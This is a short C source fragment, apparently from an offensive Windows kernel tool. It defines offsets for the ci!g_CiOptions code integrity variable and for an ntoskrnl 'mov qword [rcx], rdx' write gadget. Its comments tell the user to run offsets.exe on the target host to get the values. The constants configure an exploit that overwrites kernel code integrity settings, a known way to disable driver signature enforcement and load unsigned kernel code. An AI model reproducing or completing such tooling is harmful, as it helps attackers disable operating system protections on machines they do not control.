...
// ci!g_CiOptions
// #define CI_OPTIONS 0x3A478 // RUN offsets.exe on the target host and use the value of "Offset CiOptions" | example: 0x3A478
#pragma section(".rodata",read,write)
__declspec(allocate(".rodata")) const u_int CI_OPTIONS = 0x3A478;
// mov qword [rcx], rdx
// #define NTOSKRNL_WRITE_GADGET 0x201852 // RUN offsets.exe on the target host and use the value of "Offset asm mov" | example: 0x201852
#pragma section(".rodata",read,write)
__declspec(allocate(".rodata")) const u_int NTOSKRNL_WRITE_GADGET = 0x201852;
